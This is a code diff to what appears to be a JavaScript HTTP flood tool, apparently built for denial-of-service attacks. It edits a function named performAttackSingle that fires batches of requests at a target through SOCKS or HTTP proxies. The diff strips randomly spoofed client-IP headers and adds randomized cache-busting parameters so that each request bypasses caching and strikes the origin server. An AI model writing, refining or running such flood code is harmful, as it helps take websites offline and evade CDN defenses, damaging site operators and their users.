@@ -79,9 +79,6 @@ const getNoCacheHeaders = (forcedProfile) => {
     "Accept-Encoding": "gzip, deflate, br",
     "Accept-Language": "en-US,en;q=0.9",
     "Connection": KEEP_ALIVE ? "keep-alive" : "close",
-    "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-    "CF-Connecting-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-    "True-Client-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
   };
 };
 
@@ -117,7 +114,6 @@ function getNextProfile() {
 }
 
 function buildBrowserHeaders(profile) {
-  const spoofIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
   const h = {
     "Accept": profile.accept,
     "Accept-Encoding": "gzip, deflate, br",
@@ -127,9 +123,6 @@ function buildBrowserHeaders(profile) {
     "Connection": KEEP_ALIVE ? "keep-alive" : "close",
     "Upgrade-Insecure-Requests": "1",
     "User-Agent": profile.userAgent,
-    "X-Forwarded-For": spoofIP,
-    "CF-Connecting-IP": spoofIP,
-    "True-Client-IP": spoofIP,
   };
   
   if (profile.secCHUA) {
@@ -737,7 +730,9 @@ const performAttackSingle = async (target, ctx, threadId) => {
     const startTime = Date.now();
     const promises = [];
     for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
-      const url = target.url;
+      const cb = generateCacheBuster();
+      const sep = target.url.includes("?") ? "&" : "?";
+      const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
       if (ctx.type === "socks") {
         promises.push(socksRequest(url, ctx.agent, threadId));
       } else if (ctx.type === "http") {
